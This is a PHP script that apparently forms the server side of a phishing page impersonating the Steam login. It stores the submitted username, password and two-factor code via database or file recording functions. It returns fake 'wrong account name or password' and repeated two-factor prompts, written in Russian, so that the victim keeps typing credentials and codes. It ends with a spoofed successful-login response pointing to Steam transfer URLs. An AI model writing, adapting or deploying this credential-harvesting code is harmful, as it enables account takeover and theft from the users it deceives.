<?php
require('lib.php');

if(!isset($_POST['username']) || !isset($_POST['passwordO']) || !isset($_POST['twofactorcode'])) return;
if(mb_strlen($_POST['username']) > 100 || mb_strlen($_POST['passwordO']) > 100 || mb_strlen($_POST['twofactorcode']) > 30) return;

session_start();

if(!isset($_SESSION['step']))
	$_SESSION['step'] = 1;

if(RECORD_MODE == 'db') {
	goDB();
} else if(RECORD_MODE == 'file') {
	goFile();
} else {
	goDB();
	goFile();
}

if($_SESSION['step'] == 1) {
	header('Content-Type: application/json; charset=utf-8');
	print_r('{"success":false,"requires_twofactor":false,"message":"\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u0438\u043c\u044f \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430 \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c.","clear_password_field":true,"captcha_needed":false,"captcha_gid":-1}');
} else if($_SESSION['step'] == 2) {
	header('Content-Type: application/json; charset=utf-8');
	print_r('{"success":false,"requires_twofactor":true,"message":""}');
} else if($_SESSION['step'] == 3) {
	header('Content-Type: application/json; charset=utf-8');
	print_r('{"success":false,"requires_twofactor":true,"message":""}');
} else if($_SESSION['step'] == 4) {
	header('Content-Type: application/json; charset=utf-8');
	print_r('{"success":true,"requires_twofactor":false,"login_complete":true,"transfer_urls":["https:\/\/store.steampowered.com\/login\/transfer","https:\/\/help.steampowered.com\/login\/transfer"],"transfer_parameters":{"steamid":"007","token":"007","auth":"007","remember_login":false,"webcookie":"007","token_secure":"007"}}');

	$_SESSION['step'] = 1;
	exit;
}
$_SESSION['step']++;
?>